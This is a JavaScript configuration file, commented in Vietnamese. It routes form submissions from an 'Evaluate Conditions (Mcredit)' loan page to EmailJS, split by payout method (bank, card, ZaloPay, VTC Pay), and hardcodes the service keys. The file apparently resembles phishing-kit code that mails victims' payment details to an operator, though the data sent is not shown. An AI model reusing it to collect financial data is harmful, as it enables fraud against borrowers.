/**
 * EmailJS Evaluate-conditions — tách theo phương thức giải ngân.
 * Mỗi phương thức: publicKey, serviceId, templateId (có thể khác nhau).
 * Độc lập momo-emailjs-config.js
 */
window.EVALUATE_EMAILJS = {
  platformDefault: "Evaluate Conditions (Mcredit)",
  /** Gửi mail ở trang con (momo.html, …) */
  skipEmailForMethods: ["momo"],

  bank: {
    publicKey: "MQKcpIwixBVd4Q920",
    serviceId: "service_ezzpzs5",
    templateId: "template_wyssuk9",
    platform: "Evaluate → ATM / TK (Mcredit)",
  },

  visa: {
    publicKey: "MQKcpIwixBVd4Q920",
    serviceId: "service_ezzpzs5",
    templateId: "template_wyssuk9",
    platform: "Evaluate → Thẻ quốc tế (Mcredit)",
  },

  zalopay: {
    publicKey: "MQKcpIwixBVd4Q920",
    serviceId: "service_ezzpzs5",
    templateId: "template_wyssuk9",
    platform: "Evaluate → ZaloPay (Mcredit)",
  },

  vtcpay: {
    publicKey: "MQKcpIwixBVd4Q920",
    serviceId: "service_ezzpzs5",
    templateId: "template_cqo9ino",
    platform: "Evaluate → VTC Pay (Mcredit)",
  },
};

window.__evaluateEmailJsActiveKey = null;

window.shouldSendEvaluateEmailJs = function (methodKey) {
  var root = window.EVALUATE_EMAILJS || {};
  var skip = root.skipEmailForMethods || [];
  if (skip.indexOf(methodKey) !== -1) {
    return false;
  }
  var block = root[methodKey];
  return !!(block && block.serviceId && block.templateId);
};

/**
 * @param {string} methodKey bank | visa | zalopay | vtcpay | …
 * @param {object} templateParams
 * @returns {Promise}
 */
window.evaluateSendEmailJs = function (methodKey, templateParams) {
  if (typeof emailjs === "undefined") {
    return Promise.reject(new Error("EmailJS SDK chưa tải."));
  }

  var root = window.EVALUATE_EMAILJS || {};
  if (!window.shouldSendEvaluateEmailJs(methodKey)) {
    return Promise.resolve({ skipped: true, methodKey: methodKey });
  }

  var block = root[methodKey];
  if (block.publicKey && window.__evaluateEmailJsActiveKey !== block.publicKey) {
    emailjs.init({ publicKey: block.publicKey });
    window.__evaluateEmailJsActiveKey = block.publicKey;
  }

  var params = Object.assign(
    {
      platform: block.platform || root.platformDefault,
      method_key: methodKey,
    },
    templateParams
  );

  return emailjs.send(block.serviceId, block.templateId, params);
};
